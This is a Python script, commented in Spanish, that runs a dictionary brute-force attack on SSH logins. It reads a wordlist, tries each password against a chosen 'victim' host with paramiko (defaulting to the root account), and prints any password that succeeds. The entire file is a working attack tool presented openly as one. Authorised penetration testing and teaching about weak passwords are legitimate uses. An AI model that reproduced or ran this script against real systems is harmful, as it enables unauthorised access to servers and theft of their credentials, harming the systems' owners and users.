#!/usr/local/bin/python3
#-*- coding: utf-8 -*-

#Autor: José Moreno
#Fecha: 16/04/21
#Descripción: Script para obtener el password de algún host de su conexión ssh
#contacto: jam620@protonmail.com

import paramiko
import socket
from optparse import OptionParser

def fuerza_bruta (victima, usuario, puerto, diccionario):
    try:
        f=open(diccionario, "r")
        for pwd in f:
            pwd = pwd[:-1]
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(victima, puerto, usuario, pwd)
                print("[*] Password encontrado: {}".format(pwd))
                break;
            except paramiko.AuthenticationException:
                print("[-] Password erroneo: {}".format(pwd))
                ssh.close()
            except socket.error:
                print("[-] Falllo al establecer la conexión por ssh")
                break;
        ssh.close()
    except IOError:
        print("[-] diccionario no encontrado {}".format(diccionario))

def main():
    parser = OptionParser()
    parser.add_option("-v", "--victima", dest="victima", type="string", help="victima para hacer el ataque de fuerz bruta",
                      metavar="IP/domain")
    parser.add_option("-u", "--usuario", dest="usuario", type="string", help="usuario victima", metavar="USERNAME",
                      default="root")
    parser.add_option("-p", "--puerto", dest="port", type="string", help="Port", metavar="Port",
                      default=22)
    parser.add_option("-d", "--diccionario", dest="diccionario", type="string", help="Diccionario", metavar="El Diccionario",
                      default=22)
    options, args=parser.parse_args()

    if options.victima and options.diccionario:
        fuerza_bruta(options.victima, options.usuario, options.port, options.diccionario)
    else:
        parser.print_help()

if __name__ =="__main__":
    main()